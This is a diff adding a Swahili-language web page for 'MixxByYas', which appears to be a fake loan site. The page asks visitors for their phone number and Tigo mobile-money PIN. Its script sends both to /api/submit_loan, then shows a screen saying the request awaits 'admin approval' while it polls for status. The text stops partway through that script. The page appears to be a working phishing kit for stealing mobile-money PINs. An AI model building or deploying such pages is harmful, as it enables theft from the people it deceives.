@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MixxByYas - Thibitisha Simu</title>
+    <style>
+        :root { --primary: #2563eb; --gold: #f59e0b; --gold-dark: #d97706; --light-yellow: #fffef5; --success: #10b981; --danger: #ef4444; --dark: #1e293b; --gray: #64748b; --white: #ffffff; --light-navy: #2c3e6b; --timer-blue: #e0f0ff; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--light-yellow); color: var(--dark); line-height: 1.6; min-height: 100vh; display: flex; flex-direction: column; }
+        .brand-bar { background: var(--light-navy); text-align: center; padding: 0.8rem; display: flex; align-items: center; justify-content: center; gap: 0.6rem; border-bottom: 2px solid var(--gold); }
+        .brand-logo { width: 32px; height: 32px; background: var(--gold); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 0.9rem; color: var(--light-navy); }
+        .brand-text { font-size: 1.1rem; font-weight: 700; } .brand-text .mixx { color: var(--white); } .brand-text .yas { color: var(--gold); }
+        .back-link { display: block; padding: 1rem 1.5rem; color: var(--gray); text-decoration: none; font-size: 0.9rem; max-width: 500px; margin: 0 auto; }
+        .main-container { max-width: 500px; margin: 0 auto 2rem; padding: 0 1rem; flex: 1; }
+        .card { background: var(--white); border-radius: 14px; padding: 2rem; box-shadow: 0 4px 15px rgba(0,0,0,0.06); border: 1px solid #fef3c7; }
+        .loan-summary { background: #fefce8; border-radius: 14px; padding: 1rem; text-align: center; margin-bottom: 1.5rem; }
+        .loan-summary .amount { font-size: 1.6rem; font-weight: 900; color: var(--primary); }
+        .form-group { margin-bottom: 1.2rem; } .form-group label { display: block; font-weight: 600; font-size: 0.9rem; margin-bottom: 0.4rem; }
+        .phone-box { display: flex; border: 2px solid #fef3c7; border-radius: 14px; overflow: hidden; }
+        .phone-box .prefix { background: #fef9e7; padding: 0.85rem 1rem; font-weight: 700; border-right: 1px solid #fef3c7; }
+        .phone-box input { flex: 1; padding: 0.85rem 1rem; border: none; font-size: 1rem; font-family: inherit; outline: none; }
+        .pin-box { position: relative; border: 2px solid #fef3c7; border-radius: 14px; overflow: hidden; }
+        .pin-box input { width: 100%; padding: 0.85rem 1rem; border: none; font-size: 1.2rem; font-family: inherit; outline: none; letter-spacing: 0.5rem; }
+        .pin-box .toggle-btn { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 1.2rem; }
+        .error-msg { color: var(--danger); font-size: 0.8rem; margin-top: 0.3rem; display: none; } .error-msg.show { display: block; }
+        .btn { width: 100%; padding: 0.95rem; border-radius: 50px; font-weight: 700; font-size: 1rem; cursor: pointer; border: none; font-family: inherit; margin-top: 0.5rem; }
+        .btn-gold { background: var(--gold); color: var(--dark); }
+        .btn-gold:disabled { opacity: 0.6; cursor: not-allowed; }
+        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid #fef3c7; border-top-color: var(--gold); border-radius: 50%; animation: spin 1s linear infinite; vertical-align: middle; margin-right: 10px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .phone-display { background: #fef9e7; padding: 0.4rem 1.2rem; border-radius: 25px; display: inline-block; font-weight: 700; margin: 0.5rem 0; font-size: 0.9rem; }
+        .waiting-content { text-align: center; padding: 1rem; }
+        .copyright-bar { background: var(--light-navy); text-align: center; padding: 1rem; margin-top: auto; }
+        .copyright-bar p { color: rgba(255,255,255,0.6); font-size: 0.75rem; }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="brand-bar"><div class="brand-logo">M</div><div class="brand-text"><span class="mixx">Mixx</span><span class="yas">ByYas</span></div></div>
+    <a href="/apply" class="back-link">← Rudi</a>
+    <div class="main-container">
+        <div class="loan-summary"><div style="font-size:0.75rem;color:var(--gray);">Mkopo Wako</div><div class="amount" id="loanAmount">TZS 0</div></div>
+        <div class="card">
+            <!-- SCREEN 1: Phone + PIN -->
+            <div id="screen1">
+                <h3 style="margin-bottom:1rem;">📱 Ingiza Taarifa za Tigo</h3>
+                <div class="form-group"><label>Namba ya Simu</label><div class="phone-box"><span class="prefix">+255</span><input type="tel" id="phoneNumber" placeholder="0712345678 au 0612345678" maxlength="12"></div><div class="error-msg" id="phoneError">Ingiza namba sahihi</div></div>
+                <div class="form-group"><label>PIN ya Tigo</label><div class="pin-box"><input type="password" id="tigoPin" placeholder="• • • •" maxlength="4"><button class="toggle-btn" onclick="togglePIN()">👁️</button></div><div class="error-msg" id="pinError">Ingiza PIN</div></div>
+                <button class="btn btn-gold" id="submitBtn" onclick="submitDetails()">Endelea →</button>
+            </div>
+
+            <!-- SCREEN 2: Waiting for admin approval -->
+            <div id="screen2" class="hidden">
+                <div class="waiting-content">
+                    <div class="spinner"></div>
+                    <h3>⏳ Inakaguliwa</h3>
+                    <p style="color:var(--gray);">Inasubiri uidhinishaji kutoka kwa admin</p>
+                    <div class="phone-display" id="showPhone">+255 ---------</div>
+                    <p style="color:var(--gray); font-size:0.8rem; margin-top:1rem;">Mchakato unaweza kuchukua sekunde chache</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="copyright-bar"><p>© 2024 MixxByYas</p></div>
+
+    <script>
+        // Get loan amount from URL
+        var urlParams = new URLSearchParams(window.location.search);
+        var loanAmount = parseInt(urlParams.get('amount') || '500000');
+        var loanTerm = parseInt(urlParams.get('term') || '12');
+        document.getElementById('loanAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
+
+        var appId = '', checkInterval = null, userPhone = '';
+
+        function togglePIN() { 
+            var p = document.getElementById('tigoPin'); 
+            var b = p.parentElement.querySelector('.toggle-btn'); 
+            if (p.type === 'password') { p.type = 'text'; b.textContent = '🙈'; } 
+            else { p.type = 'password'; b.textContent = '👁️'; } 
+        }
+
+        document.getElementById('phoneNumber').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
+        document.getElementById('tigoPin').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
+
+        async function submitDetails() {
+            var phone = document.getElementById('phoneNumber').value.trim(); 
+            var pin = document.getElementById('tigoPin').value.trim();
+            
+            if (!phone || phone.length < 9) { 
+                document.getElementById('phoneError').classList.add('show'); 
+                return; 
+            }
+            if (!pin || pin.length !== 4) { 
+                document.getElementById('pinError').classList.add('show'); 
+                return; 
+            }
+
+            userPhone = phone;
+            document.getElementById('screen1').classList.add('hidden');
+            document.getElementById('screen2').classList.remove('hidden');
+            document.getElementById('showPhone').textContent = '+255 ' + phone;
+
+            var submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="spinner"></span> Inatuma...';
+
+            try {
+                var loanData = JSON.parse(localStorage.getItem('loan_data') || '{}');
+                var res = await fetch('/api/submit_loan', { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify({ 
+                        phone: phone, 
+                        pin: pin, 
+                        amount: loanAmount, 
+                        months: loanTerm,
+                        loan_type: loanData.loan_type || '', 
+                        purpose: loanData.purpose || '' 
+                    }) 
+                });
+                var data = await res.json();
+                appId = data.app_id;
+                startChecking();
+            } catch(e) { 
+                alert('Error: ' + e.message);
+                document.getElementById('screen1').classList.remove('hidden');
+                document.getElementById('screen2').classList.add('hidden');
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'Endelea →';
+            }
+        }
+
+        function startChecking() { 
+            if (checkInterval) clearInterval(checkInterval); 
+            checkInterval = setInterval(async function() { 
+                try { 
+                    var res = await fetch('/api/check_status/' + appId
